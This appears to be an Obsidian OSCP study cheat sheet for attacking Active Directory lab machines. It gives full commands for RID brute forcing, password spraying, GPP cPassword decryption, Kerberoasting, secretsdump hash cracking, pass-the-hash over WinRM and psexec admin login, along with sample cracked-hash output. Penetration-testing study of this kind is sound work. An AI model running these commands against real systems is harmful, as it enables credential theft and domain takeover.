
## NMAP Vuln Script Scan

#### TCP
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo nmap -sVC -vvv ${ip} --script vuln`;

dv.paragraph("```bash\n" + command + "\n```");
```
#### UDP
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo nmap -sV -sC -sU -vvv ${ip} --script vuln`;

dv.paragraph("```bash\n" + command + "\n```");
```

---
## Time Sync

Syncs our machine with the Domain server’s time as if we have more than a 5 min gap we will have issues.
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo ntpdate ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
---

## LDAP 389
[[389 LDAP]]
Try to ping yourself with a listener opener, the printer might try to authenticate back to listener using the password accidentally

Then try LDAP dump. There might be password and username

---

## Both User and PW Obtained : NetExec Credential Usage Sweep

Upon Entry, Once Creds for unknown usage is obtained, use [[NetExec]]to check across all services, nxc-sweep is used to automatically check all services

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `cd ~/Desktop/Tools/Windows && ./nxc-sweep ${ip} -u '[USER]' -p '[PASSWORD]'`;

dv.paragraph("```bash\n" + command + "\n```");
```

In NetExec (and its predecessor CrackMapExec), seeing (Pwn3d!) next to a set of credentials means that the provided username and password are valid and possess administrative or code execution privileges on that target

[[5985 5986 WinRM]]

---

## Only PW, looking for Users : looksupid
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = ` nxc smb ${ip} -u 'asdf' -p '' --rid-brute`;

dv.paragraph("```bash\n" + command + "\n```");
```
![[Pasted image 20260910111923.png]]

Add these usernames into user_list
### password spray  
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `nxc smb ${ip} -u [userlist] -p [pw] --continue-on-success | grep '[+]'`;

dv.paragraph("```bash\n" + command + "\n```");
```

---
# cPassword

we can use `gpp-decrypt` which uses AES-256 key to decrypt the data. `gpp-decrypt` is a utility specifically designed to decrypt the `cPassword` (or "cipher-password") attribute found in Group Policy Preferences (GPP) XML files on a Windows domain.

```
gpp-decrypt [hash]
```

---
## Service Accounts : Requires PW

Whenever getting access to domain credentials it is important to test a few of the tools from `impacket`. In this case we will use `GetUserSPNs.py` to extract encrypted passwords of any kerberoastable service accounts.

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `impacket-GetUserSPNs -request -dc-ip ${ip} active.htb/SVC_TGS`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

---

## Impacket-secretsdump

If following files are available :

1. ntds.dit
2. SYSTEM
3. SAM

[[Impacket-secretsdump]]

Paste the output into hash.txt

Filter the hashes 

```
cat hash.txt|cut -d : -f 4
```

https://crackstation.net/

Grep the cracked hash to find out which user the password belongs to
```
grep -r '12579b1666d4ac10f0f59f300776495f' hash.txt
```

---

## Impacket-secretsdump pt2

Also keep in mind, we may be able to use any of these hashes to get access to the box, so long as, they are a valid user _and_ that user is part of the Remote Management group. Let’s check by adding all the names to a file called names.txt and changing the contents of our hashes file to contain _only_ hashes. Then we will use both names.txt and our revised hashes file with crackmapexec.

![[Pasted image 20260820224339.png]]

![[Pasted image 20260820224345.png]]
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `nxc winrm ${ip} -u names.txt -H hashes`;

dv.paragraph("```bash\n" + command + "\n```");
```
```powershell
WINRM       192.168.242.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
```

(Pwn3d!) means admin access

---

Transfer [[PowerView.ps1]] to target first

Verify commands are loaded
```powershell
Get-Command Get-DomainUser
```
 
 2. Query all active user accounts with an SPN set 

 ```powershell
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
 ```
 
![[Pasted image 20260817222346.png]]

Kerberoasting is a technique that allows attackers to request a Kerberos ticket for a service associated with a Service Principal Name (SPN)

Transfer [[Rubeus.exe]] into VICTIM TARGET

Once Creds are obtained, use [[Runas]]


[[SeManageVolume]]
[[SeBackupPrivilege]]
[[SeRestorePrivilege]]
[[SeImpersonatePrivilege]]

---

# Admin SMB Login w Creds : psexec 

Now that we have these credentials we can run `psexec.py`. This `impacket` tool requires 3 things. The user needs to be a local admin on the target machine, it must have SMB open, and they must have administrative privileges to the default `IPC$` share.
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";

const command = `impacket-psexec ${discoveredDomain}/Administrator:'[PW}'@${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```







